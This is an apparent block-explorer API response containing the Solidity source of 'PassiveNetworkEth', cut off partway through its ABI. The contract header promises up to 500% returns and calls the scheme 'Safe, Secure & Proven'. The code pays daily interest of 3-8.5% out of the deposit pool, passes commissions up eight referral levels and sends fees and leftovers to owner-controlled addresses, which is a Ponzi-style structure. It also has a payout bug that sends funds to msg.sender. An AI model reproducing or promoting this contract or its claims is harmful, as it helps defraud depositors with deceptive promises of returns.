{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\n* \r\n* \r\n*   _____              _           _   _      _                      _    \r\n*  |  __ \\            (_)         | \\ | |    | |                    | |   \r\n*  | |__) |_ _ ___ ___ ___   _____|  \\| | ___| |___      _____  _ __| | __\r\n*  |  ___/ _` / __/ __| \\ \\ / / _ \\ . ` |/ _ \\ __\\ \\ /\\ / / _ \\| '__| |/ /\r\n*  | |  | (_| \\__ \\__ \\ |\\ V /  __/ |\\  |  __/ |_ \\ V  V / (_) | |  |   < \r\n*  |_|   \\__,_|___/___/_| \\_/ \\___|_| \\_|\\___|\\__| \\_/\\_/ \\___/|_|  |_|\\_\\\r\n*                                                                         \r\n*                                                                         \r\n* Earn up to 500% Return on your investment!\r\n*\r\n* - From the team who brought you:\r\n* -   https://ETHMatrix.network \r\n* -   https://TRONMatrix.com\r\n*\r\n* Comes https://Passive.Network\r\n*\r\n* - Available for both Tron and Ethereum!\r\n*\r\n* - Safe, Secure & Proven!\r\n*\r\n*/\r\n\r\npragma solidity ^0.5.9;\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b);\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a);\r\n\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract PassiveNetworkEth {\r\n\r\n    using SafeMath for uint256;\r\n    \r\n    event Deposit(address indexed player, address indexed referrer, uint amount);\r\n    event Reinvest(address indexed player, uint amount);\r\n    event Withdrawal(address indexed player, uint amount);\r\n    event ExitGame(address indexed player, uint amount);\r\n    \r\n    uint public totalPlayers;\r\n    uint public totalPayout;\r\n    uint public totalInvested;\r\n    \r\n    uint private minDepositSize1 = 0.025 ether;\r\n    uint private minDepositSize2 = 0.25 ether;\r\n    uint private minDepositSize3 = 0.5 ether;\r\n    uint private minDepositSize4 = 1.5 ether;\r\n    uint private minDepositSize5 = 3 ether;\r\n    uint private minDepositSize6 = 15 ether;\r\n    uint private minDepositSize7 = 30 ether;\r\n    uint private interestRateDivisor = 1000000000000;\r\n    \r\n    \r\n    \r\n    uint public interestDivisor = 10000;\r\n    \r\n    uint public exitFee = 3500; // 35.00%\r\n    uint public techCommission = 300; // 3.00%\r\n    uint public markCommission = 300; // 3.00%\r\n\r\n    \r\n    \r\n    uint public Aff = 2400; // 24.00%\r\n    uint public Aff1 = 750; // 7.50%\r\n    uint public Aff1A = 800; // 8.00%\r\n    uint public Aff1B = 1000; // 10.00%\r\n    uint public Aff2 = 500; // 5%\r\n    uint public Aff3 = 300; // 3%\r\n    uint public Aff4 = 200; // 2%\r\n    uint public Aff5_8 = 100; // 1%\r\n    \r\n\r\n    uint public MaxEarning1 = 20000; // 200.00%\r\n    uint public MaxEarning2 = 25000; // 250.00%\r\n    uint public MaxEarning3 = 30000; // 300.00%\r\n    uint public MaxEarning4 = 35000; // 350.00%\r\n    uint public MaxEarning5 = 40000; // 400.00%\r\n    uint public MaxEarning6 = 45000; // 450.00%\r\n    uint public MaxEarning7 = 50000; // 500.00%\r\n\r\n\r\n    uint private interestPerSecond3 = 347223; //3%\r\n    uint private interestPerSecond3_5 = 405093; //3.5%\r\n    uint private interestPerSecond4 = 462963; //4%\r\n    uint private interestPerSecond4_5 = 520833; //4.5%\r\n    uint private interestPerSecond5 = 578704; //5%\r\n    uint private interestPerSecond5_5 = 636574; //5%\r\n    uint private interestPerSecond6 = 694444; //6%\r\n    uint private interestPerSecond6_5 = 752315; //6.5%\r\n    uint private interestPerSecond7 = 810185; //7%\r\n    uint private interestPerSecond7_5 = 868056; //7.5%\r\n    uint private interestPerSecond8 = 925926; //8%\r\n    uint private interestPerSecond8_5 = 983796; //8.5%\r\n    \r\n    \r\n    bool private isOpen = false;\r\n    \r\n    address private feed1;\r\n    address private feed2;\r\n    address owner;\r\n    \r\n    \r\n    struct Player {\r\n        uint trxDeposit;\r\n        uint time;\r\n        uint interestProfit;\r\n        uint affRewards;\r\n        uint payoutSum;\r\n        address affFrom;\r\n        uint256 aff1sum; \r\n        uint256 aff2sum;\r\n        uint256 aff3sum;\r\n        uint256 aff4sum;\r\n        uint256 aff5sum;\r\n        uint256 aff6sum;\r\n        uint256 aff7sum;\r\n        uint256 aff8sum;\r\n    }\r\n    \r\n    mapping(address => uint256) public lastWithdrawal;\r\n    mapping(address => bool) public playerExit;\r\n    mapping(address => Player) public players;\r\n\r\n    constructor(address _feed1, address _feed2) public {\r\n      owner = msg.sender;\r\n      feed1 = _feed1;\r\n      feed2 = _feed2;\r\n    }\r\n\r\n\r\n    function register(address _addr, address _affAddr) private{\r\n        require(playerExit[_addr] == false, \"Player has exited!\");\r\n        \r\n        Player storage player = players[_addr];\r\n        \r\n        player.affFrom = _affAddr;\r\n        \r\n        address _affAddr1 = _affAddr;\r\n        address _affAddr2 = players[_affAddr1].affFrom;\r\n        address _affAddr3 = players[_affAddr2].affFrom;\r\n        address _affAddr4 = players[_affAddr3].affFrom;\r\n        address _affAddr5 = players[_affAddr4].affFrom;\r\n        address _affAddr6 = players[_affAddr5].affFrom;\r\n        address _affAddr7 = players[_affAddr6].affFrom;\r\n        address _affAddr8 = players[_affAddr7].affFrom;\r\n\r\n\r\n        if(_affAddr1 != address(0))\r\n            players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);\r\n\r\n        if(_affAddr2 != address(0))\r\n            players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);\r\n            \r\n        if(_affAddr3 != address(0))\r\n            players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);\r\n\r\n        if(_affAddr4 != address(0))\r\n            players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);\r\n\r\n        if(_affAddr5 != address(0))\r\n            players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);\r\n\r\n        if(_affAddr6 != address(0))\r\n            players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);\r\n\r\n        if(_affAddr7 != address(0))\r\n            players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);\r\n\r\n        if(_affAddr8 != address(0))\r\n            players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);\r\n            \r\n        lastWithdrawal[_addr] = now;\r\n        \r\n        \r\n    }\r\n\r\n    function () external payable {\r\n\r\n    }\r\n\r\n    function deposit(address _affAddr) public payable {\r\n\r\n        require(isOpen == true, \"Game not yet open!\");\r\n        require(msg.value >= minDepositSize1);\r\n\r\n\r\n        uint depositAmount = msg.value;\r\n\r\n        Player storage player = players[msg.sender];\r\n\r\n        if (player.time == 0) {\r\n            player.time = now;\r\n            totalPlayers++;\r\n            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){\r\n              register(msg.sender, _affAddr);\r\n            }\r\n            else{\r\n              register(msg.sender, owner);\r\n            }\r\n        } else {\r\n            if(playerExit[msg.sender] == true) {\r\n                // reset as a fresh/new player if they wish to rejoin\r\n                player.trxDeposit = 0;\r\n                player.time = now;\r\n                player.interestProfit = 0;\r\n                player.payoutSum = 0;\r\n                lastWithdrawal[msg.sender] = now;\r\n                playerExit[msg.sender] = false;\r\n            }\r\n        }\r\n        player.trxDeposit = player.trxDeposit.add(depositAmount);\r\n\r\n        distributeRef(msg.value, player.affFrom);\r\n\r\n        totalInvested = totalInvested.add(depositAmount);\r\n        uint feedEarn1 = depositAmount.mul(techCommission).div(interestDivisor);\r\n        uint feedEarn2 = depositAmount.mul(markCommission).div(interestDivisor);\r\n        address(uint160(feed1)).transfer(feedEarn1);\r\n        address(uint160(feed2)).transfer(feedEarn2);\r\n\r\n        emit Deposit(msg.sender, _affAddr, msg.value);\r\n    }\r\n\r\n    function withdraw() public {\r\n        require(playerExit[msg.sender] == false, \"Player has exited!\");\r\n        \r\n        collect(msg.sender);\r\n        require(players[msg.sender].interestProfit > 0);\r\n\r\n        transferPayout(msg.sender, players[msg.sender].interestProfit);\r\n        \r\n\r\n    }\r\n\r\n    function reinvest() public {\r\n        require(playerExit[msg.sender] == false, \"Player has exited!\");\r\n        collect(msg.sender);\r\n        Player storage player = players[msg.sender];\r\n        uint256 depositAmount = player.interestProfit;\r\n        require(address(this).balance >= depositAmount);\r\n        player.interestProfit = 0;\r\n        player.trxDeposit = player.trxDeposit.add(depositAmount);\r\n        totalInvested = totalInvested.add(depositAmount);\r\n\r\n        distributeRef(depositAmount, player.affFrom);\r\n\r\n        uint feedEarn1 = depositAmount.mul(techCommission).div(interestDivisor);\r\n        uint feedEarn2 = depositAmount.mul(markCommission).div(interestDivisor);\r\n        address(uint160(feed1)).transfer(feedEarn1);\r\n        address(uint160(feed2)).transfer(feedEarn2);\r\n\r\n        emit Reinvest(msg.sender, depositAmount);\r\n        \r\n    }\r\n    \r\n\r\n    function getExitAmount(address _addr) public view returns (uint) {\r\n        require(playerExit[_addr] == false, \"Player has exited!\");\r\n        require(players[_addr].trxDeposit > players[_addr].payoutSum, \"You have already ROI, you cannot exit the game now!\");\r\n        uint _currentInterestProfit = getProfit(_addr);\r\n        return players[_addr].trxDeposit.sub(players[_addr].trxDeposit.mul(exitFee).div(interestDivisor)).sub(_currentInterestProfit).sub(players[_addr].payoutSum);\r\n    }\r\n    \r\n    function exit() public {\r\n        require(playerExit[msg.sender] == false, \"Player has exited!\");\r\n        collect(msg.sender);\r\n        Player storage player = players[msg.sender];\r\n        if(player.interestProfit > 0)\r\n            transferPayout(msg.sender, players[msg.sender].interestProfit);\r\n            \r\n        require(player.trxDeposit > player.payoutSum, \"You have already ROI, you cannot exit the game now!\");\r\n        \r\n        uint roiAmount = player.trxDeposit.sub(player.trxDeposit.mul(exitFee).div(interestDivisor)).sub(player.payoutSum);\r\n\r\n        playerExit[msg.sender] = true;        \r\n        address(uint160(msg.sender)).transfer(roiAmount);\r\n\r\n        emit ExitGame(msg.sender, roiAmount);\r\n    }\r\n\r\n\r\n    function collect(address _addr) internal  {\r\n        Player storage player = players[_addr];\r\n\r\n        uint collectProfit = playerProfit(_addr);\r\n        uint secPassed = now.sub(player.time);\r\n\r\n        \r\n        if (collectProfit > 0) {\r\n         \r\n            if (collectProfit > address(this).balance){ collectProfit = 0;}\r\n         \r\n            player.interestProfit = player.interestProfit.add(collectProfit);\r\n            player.time = player.time.add(secPassed);\r\n        }\r\n    }\r\n\r\n    function transferPayout(address _receiver, uint _amount) internal {\r\n        if (_amount > 0 && _receiver != address(0)) {\r\n          uint contractBalance = address(this).balance;\r\n            if (contractBalance > 0) {\r\n                uint payout = _amount > contractBalance ? contractBalance : _amount;\r\n                totalPayout = totalPayout.add(payout);\r\n\r\n                Player storage player = players[_receiver];\r\n                player.payoutSum = player.payoutSum.add(payout);\r\n                player.interestProfit = player.interestProfit.sub(payout);\r\n                lastWithdrawal[msg.sender] = now;\r\n                msg.sender.transfer(payout);\r\n                emit Withdrawal(msg.sender, payout);\r\n            }\r\n        }\r\n    }\r\n\r\n    function distributeRef(uint256 _trx, address _affFrom) private{\r\n\r\n        uint256 _allaff = (_trx.mul(Aff)).div(interestDivisor);\r\n\r\n        address _affAddr1 = _affFrom;\r\n        address _affAddr2 = players[_affAddr1].affFrom;\r\n        address _affAddr3 = players[_affAddr2].affFrom;\r\n        address _affAddr4 = players[_affAddr3].affFrom;\r\n        address _affAddr5 = players[_affAddr4].affFrom;\r\n        address _affAddr6 = players[_affAddr5].affFrom;\r\n        address _affAddr7 = players[_affAddr6].affFrom;\r\n        address _affAddr8 = players[_affAddr7].affFrom;\r\n        uint256 _affRewards = 0;\r\n        \r\n             if (_affAddr1 != address(0)) {\r\n             \r\n             if (players[_affAddr1].aff1sum <= 10){_affRewards = (_trx.mul(Aff1A)).div(interestDivisor);} \r\n             if (players[_affAddr1].aff1sum > 10 && players[_affAddr1].aff1sum <= 50){_affRewards = (_trx.mul(Aff1B)).div(interestDivisor);} \r\n             if (players[_affAddr1].aff1sum > 50){_affRewards = (_trx.mul(Aff1)).div(interestDivisor);}\r\n            \r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);\r\n            address(uint160(_affAddr1)).transfer(_affRewards);\r\n           \r\n        }\r\n\r\n        if (_affAddr2 != address(0)) {\r\n            _affRewards = (_trx.mul(Aff2)).div(interestDivisor);\r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);\r\n            address(uint160(_affAddr2)).transfer(_affRewards);\r\n        }\r\n\r\n        if (_affAddr3 != address(0)) {\r\n            _affRewards = (_trx.mul(Aff3)).div(interestDivisor);\r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);\r\n            address(uint160(_affAddr3)).transfer(_affRewards);\r\n        }\r\n\r\n        if (_affAddr4 != address(0)) {\r\n            _affRewards = (_trx.mul(Aff4)).div(interestDivisor);\r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);\r\n            address(uint160(_affAddr4)).transfer(_affRewards);\r\n        }\r\n\r\n        if (_affAddr5 != address(0)) {\r\n            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);\r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);\r\n            address(uint160(_affAddr5)).transfer(_affRewards);\r\n        }\r\n\r\n        if (_affAddr6 != address(0)) {\r\n            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);\r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);\r\n            address(uint160(_affAddr6)).transfer(_affRewards);\r\n        }\r\n\r\n        if (_affAddr7 != address(0)) {\r\n            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);\r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);\r\n            address(uint160(_affAddr7)).transfer(_affRewards);\r\n        }\r\n\r\n        if (_affAddr8 != address(0)) {\r\n            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);\r\n            _allaff = _allaff.sub(_affRewards);\r\n            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);\r\n            address(uint160(_affAddr8)).transfer(_affRewards);\r\n        }\r\n\r\n        if(_allaff > 0 ){\r\n            address(uint160(owner)).transfer(_allaff);\r\n        }\r\n    }\r\n\r\n\r\n    function playerProfit(address _addr) internal view returns (uint) {\r\n        uint interestRate;\r\n        uint maxEarning;\r\n        uint collectProfit;\r\n        uint secPassed = now.sub(players[_addr].time);\r\n        uint _lastWithdrawal = now - lastWithdrawal[_addr];\r\n        uint _trxDeposit = players[_addr].trxDeposit;\r\n        \r\n        if (secPassed > 0 && players[_addr].time > 0) {\r\n        \r\n            // band 1 & 2 - 3% base rate\r\n            if (_trxDeposit <= minDepositSize3) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond5;    \r\n                } else {\r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond4;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond3_5;\r\n                        else\r\n                            interestRate = interestPerSecond3;\r\n                    }\r\n                }\r\n             \r\n                if(_trxDeposit <= minDepositSize2)\r\n                    maxEarning = MaxEarning1;\r\n                else\r\n                    maxEarning = MaxEarning2;\r\n            }\r\n        \r\n            // band 3 & 4 - 4% base rate\r\n             if (_trxDeposit > minDepositSize3 && _trxDeposit <= minDepositSize5) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond6;    \r\n                } else {\r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond5;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond4_5;\r\n                        else\r\n                            interestRate = interestPerSecond4;\r\n                    }\r\n                }\r\n                \r\n                if(_trxDeposit <= minDepositSize4)\r\n                    maxEarning = MaxEarning3;\r\n                else\r\n                    maxEarning = MaxEarning4;\r\n            }\r\n            \r\n            \r\n            // band 5 & 6 - 5% base rate\r\n             if (_trxDeposit > minDepositSize5 && _trxDeposit <= minDepositSize7) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond7;    \r\n                } else {\r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond6;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond5_5;\r\n                        else\r\n                            interestRate = interestPerSecond5;\r\n                    }\r\n                }\r\n                \r\n                if(_trxDeposit <= minDepositSize5)\r\n                    maxEarning = MaxEarning5;\r\n                else\r\n                    maxEarning = MaxEarning6;\r\n            }\r\n            \r\n            if(_trxDeposit > minDepositSize7) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond7;    \r\n                } else {\r\n                    \r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond6;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond5_5;\r\n                        else\r\n                            interestRate = interestPerSecond5;\r\n                    }\r\n                }\r\n                maxEarning = MaxEarning7;\r\n            }\r\n\r\n\r\n        \r\n            uint collectProfitGross = (_trxDeposit.mul(secPassed.mul(interestRate))).div(interestRateDivisor);\r\n         \r\n            uint256 maxprofit = (_trxDeposit.mul(maxEarning).div(interestDivisor));\r\n            uint256 collectProfitNet = collectProfitGross.add(players[_addr].interestProfit);\r\n            uint256 amountpaid = (players[_addr].payoutSum.add(players[_addr].affRewards));\r\n            uint256 sum = amountpaid.add(collectProfitNet);\r\n         \r\n         \r\n            if (sum <= maxprofit) {\r\n                collectProfit = collectProfitGross; \r\n            } else {\r\n                uint256 collectProfit_net = maxprofit.sub(amountpaid); \r\n             \r\n                if (collectProfit_net > 0) {\r\n                    collectProfit = collectProfit_net; \r\n                } else {\r\n                    collectProfit = 0; \r\n                }\r\n            }\r\n         \r\n            if (collectProfit > address(this).balance){ collectProfit = 0;}\r\n         \r\n            return collectProfit;\r\n\r\n        }   else {\r\n            return 0;\r\n        }\r\n    }\r\n\r\n\r\n    function getInterestBandInfo(address _addr) public view returns (uint interestRate, uint maxEarning) {\r\n        uint secPassed = now.sub(players[_addr].time);\r\n        uint _lastWithdrawal = now - lastWithdrawal[_addr];\r\n        uint _trxDeposit = players[_addr].trxDeposit;\r\n        \r\n        if (secPassed > 0 && players[_addr].time > 0) {\r\n        \r\n            // band 1 & 2 - 3% base rate\r\n            if (_trxDeposit <= minDepositSize3) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond5;    \r\n                } else {\r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond4;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond3_5;\r\n                        else\r\n                            interestRate = interestPerSecond3;\r\n                    }\r\n                }\r\n             \r\n                if(_trxDeposit <= minDepositSize2)\r\n                    maxEarning = MaxEarning1;\r\n                else\r\n                    maxEarning = MaxEarning2;\r\n            }\r\n        \r\n            // band 3 & 4 - 4% base rate\r\n             if (_trxDeposit > minDepositSize3 && _trxDeposit <= minDepositSize5) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond6;    \r\n                } else {\r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond5;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond4_5;\r\n                        else\r\n                            interestRate = interestPerSecond4;\r\n                    }\r\n                }\r\n                \r\n                if(_trxDeposit <= minDepositSize4)\r\n                    maxEarning = MaxEarning3;\r\n                else\r\n                    maxEarning = MaxEarning4;\r\n            }\r\n            \r\n            \r\n            // band 5 & 6 - 5% base rate\r\n             if (_trxDeposit > minDepositSize5 && _trxDeposit <= minDepositSize7) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond7;    \r\n                } else {\r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond6;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond5_5;\r\n                        else\r\n                            interestRate = interestPerSecond5;\r\n                    }\r\n                }\r\n                \r\n                if(_trxDeposit <= minDepositSize5)\r\n                    maxEarning = MaxEarning5;\r\n                else\r\n                    maxEarning = MaxEarning6;\r\n            }\r\n            \r\n            if(_trxDeposit > minDepositSize7) {\r\n                if(_lastWithdrawal >= 60 days){\r\n                    interestRate = interestPerSecond7;    \r\n                } else {\r\n                    \r\n                    if(_lastWithdrawal >= 30 days) {\r\n                        interestRate = interestPerSecond6;   \r\n                    } else {\r\n                        if(_lastWithdrawal >= 14 days) \r\n                            interestRate = interestPerSecond5_5;\r\n                        else\r\n                            interestRate = interestPerSecond5;\r\n                    }\r\n                }\r\n                maxEarning = MaxEarning7;\r\n            }\r\n        }    \r\n    }\r\n\r\n    function getProfit(address _addr) public view returns (uint) {\r\n        if(playerExit[msg.sender] == true)\r\n            return 0;\r\n        \r\n        \r\n            \r\n        address playerAddress= _addr;\r\n        Player storage player = players[playerAddress];\r\n        require(player.time > 0);\r\n        uint collectProfit;\r\n      \r\n        collectProfit =  playerProfit(_addr);\r\n  \r\n        return collectProfit.add(player.interestProfit);\r\n      \r\n      }\r\n    \r\n    \r\n    function updateFeed1(address _address) public  {\r\n       require(msg.sender==owner);\r\n       feed1 = _address;\r\n    }\r\n    \r\n    function updateFeed2(address _address) public {\r\n        require(msg.sender==owner);\r\n        feed2 = _address;\r\n    }\r\n    \r\n\r\n    \r\n\r\n     function setOpen(bool _isOpen) public {\r\n      require(msg.sender==owner);\r\n      isOpen = _isOpen;\r\n    }\r\n\r\n    \r\n     function setOwner(address _address) public {\r\n      require(msg.sender==owner);\r\n      owner = _address;\r\n    }\r\n    \r\n\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_feed1\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_feed2\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"player\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"player\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ExitGame\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"player\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Reinvest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"player\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawal\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff1\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff1A\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff1B\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff3\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff4\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Aff5_8\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MaxEarning1\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MaxEarning2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MaxEarning3\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MaxEarning4\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MaxEarning5\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MaxEarning6\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MaxEarning7\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_affAddr\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"exit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"exitFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"getExitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"getInterestBandInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"interestRate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxEarning\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"getProfit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"interestDivisor\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"lastWithdrawal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"markCommission\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"paya